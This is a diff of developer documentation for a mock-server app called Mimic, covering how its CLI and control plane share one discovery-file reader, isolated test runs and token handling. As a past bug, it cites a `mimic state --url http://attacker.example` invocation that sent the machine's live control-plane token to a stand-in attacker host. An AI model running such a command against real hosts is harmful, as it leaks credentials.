@@ -171,29 +171,31 @@ behaviour is what kept it out of the docs' recommended path:
   Mimic open, running this script quit the developer's own instance, on every exit path including
   the ones where it had launched nothing. The pid now comes out of what `mimic app start` printed
   about the process it launched.
-- **It needs `MIMIC_CONTROL_FILE`, and it exports it** (`"$WORK/control.json"`). That variable is
-  read by `ControlEndpointFile.writeURL` and `searchURLs` in `ControlPlane`, and the override
-  *replaces* the search list instead of joining the front of it, so this run cannot fall through to
-  a developer's real instance. The script asserts the file exists after launch, because the app —
-  not the script — is what honours the variable, and if it is missing the instance advertised itself
-  at the shared path after all.
+- **It needs `MIMIC_CONTROL_FILE`, and it exports it** (`"$WORK/control.json"`). Both halves of the
+  contract resolve that variable through one function — `ControlEndpointDiscovery.overrideURL` in
+  `Domain` — and the override *replaces* the search list instead of joining the front of it, so this
+  run cannot fall through to a developer's real instance in either direction: the app's write side
+  (`ControlEndpointFile` in `ControlPlane`) advertises inside `$WORK`, and the CLI's reader searches
+  only there. The script still asserts the file exists after launch, because the write half is the
+  app's to honour, and if the file is missing the instance advertised itself at the shared path
+  after all.
 - `set -euo pipefail` is now on, so a line added without a trailing `|| fail` cannot pass silently.
 
-**The CLI half of that variable is not implemented.** `MimicCLICore`'s own discovery reader — a
-second copy, because the CLI links no `ControlPlane` — still searches only the two Application
-Support paths (`grep -n MIMIC_CONTROL_FILE Sources/MimicCLICore/*.swift` returns nothing).
-
-**So an isolated run has to supply the token, not only the destination.** This paragraph used to say
-the script was "unaffected only because it also exports `MIMIC_CONTROL_URL` and `MIMIC_CONTROL_PORT`,
-which win in `resolveBaseURL` before discovery is consulted", and that is half an answer: those two
-resolve *where* to send a command and carry no credential — `resolveToken` never consults either.
-Move the file and `mimic` finds no `control.json` at all, so it sends no `X-Mimic-Token`, and
-`ControlServer.denial` guards every route including `/health`; every command comes back 401 while
-`mimic app start` still looks fine, because `isReachable` accepts a 401 as proof something answered.
-`Scripts/run_cli_e2e.sh` therefore exports `MIMIC_CONTROL_TOKEN` as well, which `ControlServer.init`
-takes for the token it demands and `ControlEndpointFileReader.resolveToken` takes first for the one
-it sends. Anything else wanting an isolated run needs all four, and mirroring `MIMIC_CONTROL_FILE`
-into `MimicCLICore` — which would reduce that to two — is an open item.
+**The CLI reads the file through the same contract the app writes through.** `MimicCLICore` used to
+carry a second copy of the discovery reader — it links no `ControlPlane` — and that copy searched
+only the two Application Support paths, so `MIMIC_CONTROL_FILE` was honoured on the write side alone:
+move the file and `mimic` found no `control.json` at all, sent no `X-Mimic-Token`, and every command
+came back 401 while `mimic app start` still looked fine, because `isReachable` accepts a 401 as
+proof something answered. An isolated run therefore had to export the destination
+(`MIMIC_CONTROL_URL` or `MIMIC_CONTROL_PORT`) *and* the credential (`MIMIC_CONTROL_TOKEN`) by hand —
+four variables. The read half now lives once, in `Domain` as `ControlEndpointDiscovery`, and the CLI
+resolves through it, so destination and credential both come out of the relocated file and the
+four-variable dance is gone. The script still exports two of them for reasons that are not CLI
+plumbing: `MIMIC_CONTROL_PORT` is the *app's* bind port (`ControlPlaneCoordinator.resolvePort` reads
+it), kept off the default 8787 a developer's own instance is holding, and `MIMIC_CONTROL_TOKEN` —
+which `ControlServer.init` takes for the token it demands and
+`ControlEndpointDiscovery.resolveToken` reads first on the sending side — is fresh per run so a
+leftover file from a previous run cannot authenticate against this one.
 
 When touching anything the Linux build compiles, remember it is not macOS: `URLSession` lives in
 `FoundationNetworking`, the BSD socket calls live in `Glibc` rather than `Darwin`, and some C types
@@ -262,8 +264,10 @@ mimic (CLI) → MimicCLICore → Domain (+ ArgumentParser)
 ```
 
 - **Domain** — value types and pure rules (models, `RequestMatcher`, `JourneyResolver`,
-  `MockResolver`, validation, and the `ControlCommand` language with its pure executor).
-  Foundation only.
+  `MockResolver`, validation, and the `ControlCommand` language with its pure executor), plus
+  `ControlEndpointDiscovery`, the read half of the discovery-file contract — file I/O and `kill(2)`
+  liveness, the one deliberately impure corner, shared by the CLI and the control plane so the
+  contract exists once. Foundation only.
 - **MockServerEngine** — the embedded Vapor runtime; serves requests by asking Domain to resolve, and
   owns the live journey cursor.
 - **Persistence** — GRDB storage behind the `ProjectRepository` port.
@@ -707,7 +711,7 @@ When adding or changing an operation:
    **A discovered token goes to the instance that advertised it, and nowhere else.** Destination and
    credential are now resolved together in `ControlClient.discover`: the token from `control.json` is
    attached only when the URL's *host* is loopback (`127.0.0.1`, `::1`, `[::1]`, `localhost`) **and**
-   its port is the one that file advertised — `ControlEndpointFileReader.namesDiscoveredInstance`.
+   its port is the one that file advertised — `ControlEndpointDiscovery.namesDiscoveredInstance`.
    They used to be resolved independently, so `mimic state --url http://attacker.example` posted this
    machine's live control-plane credential to that host in an `X-Mimic-Token` header. A caller
    legitimately reaching Mimic through a forwarded port or a container supplies the credential
@@ -722,10 +726,14 @@ When adding or changing an operation:
    longer be stopped by `mimic app stop`; the refusal names the pid and prints `kill <pid>`.
 
    **`MIMIC_CONTROL_FILE` relocates the discovery file** for a run that must not touch the shared
-   one. `ControlEndpointFile.writeURL` and `searchURLs` honour it, the override *replaces* the search
-   list rather than joining the front of it, and the parent directory is created `0700` on that path
-   too — an isolated run is not a less sensitive one. `MimicCLICore`'s copy of the reader does **not**
-   honour it yet; see the `run_cli_e2e.sh` section above.
+   one. Both sides honour it through one function — the read half is `ControlEndpointDiscovery` in
+   `Domain`, which the CLI resolves through and whose `overrideURL` the write side
+   (`ControlEndpointFile.writeURL` in `ControlPlane`) delegates to — the override *replaces* the
+   search list rather than joining the front of it, and the parent directory is created `0700` on
+   that path too: an isolated run is not a less sensitive one. The reader used to be implemented
+   twice, and the copies drifted in both directions (the override only on the app's side, the
+   token-pairing hardening only on the CLI's); `Domain` is the one home the module-edge gate allows
+   both to share, so keep it there.
 
 ## Skill Integration — Mandatory
 
